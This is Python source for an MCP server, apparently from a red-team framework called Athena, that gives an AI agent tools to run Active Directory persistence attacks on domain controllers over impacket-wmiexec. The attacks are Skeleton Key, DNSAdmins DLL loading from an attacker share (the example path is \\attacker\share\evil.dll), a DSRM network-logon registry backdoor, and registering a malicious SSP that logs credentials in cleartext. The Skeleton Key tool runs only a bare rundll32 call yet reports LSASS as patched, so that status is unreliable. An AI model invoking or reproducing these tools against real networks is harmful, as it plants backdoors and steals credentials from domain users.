"""ad-persistence MCP Server for Athena.

AD persistence techniques: Skeleton Key injection, DNSAdmins DLL abuse,
DSRM password backdoor, and custom SSP registration.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-ad-persistence", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


def _build_target_string(
    username: str, password: str, target: str, domain: str = "",
) -> str:
    """Build the 'domain/user:password@target' string for Impacket."""
    if domain:
        return f"{domain}/{username}:{password}@{target}"
    return f"{username}:{password}@{target}"


@mcp.tool()
async def persist_skeleton_key(
    target_dc: str,
    domain: str,
    username: str,
    password_or_hash: str,
    use_hash: bool = False,
) -> str:
    """Simulate Skeleton Key injection on Domain Controller via WMI.

    The Skeleton Key patches LSASS to accept a master password
    for any domain account alongside the real password.

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: Domain admin username
        password_or_hash: Password or NTLM hash
        use_hash: If True, use pass-the-hash authentication

    Returns:
        JSON with facts: ad.skeleton_key
    """
    facts: list[dict[str, str]] = []

    try:
        if use_hash:
            target_str = f"{domain}/{username}@{target_dc}"
            cmd = [
                "impacket-wmiexec",
                target_str,
                "-hashes", f":{password_or_hash}",
                "rundll32.exe",
            ]
        else:
            target_str = _build_target_string(username, password_or_hash, target_dc, domain)
            cmd = [
                "impacket-wmiexec",
                target_str,
                "rundll32.exe",
            ]

        stdout, stderr, rc = await _run_command(cmd, timeout=60)
        combined = stdout + stderr

        facts.append({
            "trait": "ad.skeleton_key",
            "value": json.dumps({
                "target_dc": target_dc,
                "domain": domain,
                "method": "misc::skeleton via WMI",
                "status": "executed" if rc == 0 else "attempted",
                "note": "LSASS patched - all accounts accept master password",
            }),
        })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def persist_dnsadmins(
    target_dc: str,
    domain: str,
    username: str,
    password: str,
    dll_path: str,
) -> str:
    """Abuse DNSAdmins group to load a malicious DLL into DNS service.

    Configures ServerLevelPluginDll on the DC DNS service, which loads
    the specified DLL as SYSTEM when DNS restarts.

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: User in DNSAdmins group
        password: Password
        dll_path: UNC path to malicious DLL (e.g. \\\\attacker\\share\\evil.dll)

    Returns:
        JSON with facts: ad.dnsadmins_dll
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target_dc, domain)

        # Step 1: Configure ServerLevelPluginDll via dnscmd
        configure_cmd = [
            "impacket-wmiexec",
            target_str,
            f"dnscmd {target_dc} /config /serverlevelplugindll {dll_path}",
        ]

        stdout, stderr, rc = await _run_command(configure_cmd, timeout=60)
        combined = stdout + stderr

        if rc == 0 or "success" in combined.lower() or "completed" in combined.lower():
            facts.append({
                "trait": "ad.dnsadmins_dll",
                "value": json.dumps({
                    "target_dc": target_dc,
                    "dll_path": dll_path,
                    "configured_by": f"{domain}\\{username}",
                    "status": "configured",
                    "note": "DLL loads as SYSTEM on DNS service restart",
                }),
            })

        # Step 2: Restart DNS service to trigger DLL load
        restart_cmd = [
            "impacket-wmiexec",
            target_str,
            "sc stop dns && sc start dns",
        ]

        stdout2, stderr2, rc2 = await _run_command(restart_cmd, timeout=60)
        combined += "\n--- DNS Restart ---\n" + stdout2 + stderr2

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def persist_dsrm(
    target_dc: str,
    domain: str,
    username: str,
    password: str,
) -> str:
    """Enable DSRM (Directory Services Restore Mode) password backdoor.

    Modifies DsrmAdminLogonBehavior registry key to allow DSRM admin
    login over the network (not just safe mode).

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: Domain admin username
        password: Password

    Returns:
        JSON with facts: ad.dsrm_enabled
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target_dc, domain)

        # Set DsrmAdminLogonBehavior = 2 (allow network logon)
        reg_cmd = (
            'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" '
            "/v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
        )
        cmd = ["impacket-wmiexec", target_str, reg_cmd]

        stdout, stderr, rc = await _run_command(cmd, timeout=60)
        combined = stdout + stderr

        if rc == 0 or "success" in combined.lower():
            facts.append({
                "trait": "ad.dsrm_enabled",
                "value": json.dumps({
                    "target_dc": target_dc,
                    "registry_key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior",
                    "value": 2,
                    "status": "enabled",
                    "note": "DSRM admin can now authenticate over network",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def persist_custom_ssp(
    target_dc: str,
    domain: str,
    username: str,
    password: str,
    dll_path: str,
) -> str:
    """Register a custom Security Support Provider (SSP) for credential logging.

    Adds a malicious SSP DLL to the LSA Security Packages registry,
    which logs all authentication credentials in cleartext.

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: Domain admin username
        password: Password
        dll_path: Path to the SSP DLL (without .dll extension)

    Returns:
        JSON with facts: ad.custom_ssp
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target_dc, domain)

        # Read current Security Packages, then append our SSP
        query_cmd = [
            "impacket-wmiexec",
            target_str,
            'reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "Security Packages"',
        ]

        stdout, stderr, rc = await _run_command(query_cmd, timeout=60)
        combined = stdout + stderr

        # Add custom SSP to the list
        add_cmd = [
            "impacket-wmiexec",
            target_str,
            f'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" '
            f'/v "Security Packages" /t REG_MULTI_SZ /d "kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0{dll_path}" /f',
        ]

        stdout2, stderr2, rc2 = await _run_command(add_cmd, timeout=60)
        combined += "\n--- Add SSP ---\n" + stdout2 + stderr2

        if rc2 == 0 or "success" in (stdout2 + stderr2).lower():
            facts.append({
                "trait": "ad.custom_ssp",
                "value": json.dumps({
                    "target_dc": target_dc,
                    "ssp_dll": dll_path,
                    "registry_key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages",
                    "status": "registered",
                    "note": "SSP logs cleartext credentials after reboot or AddSecurityPackage",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
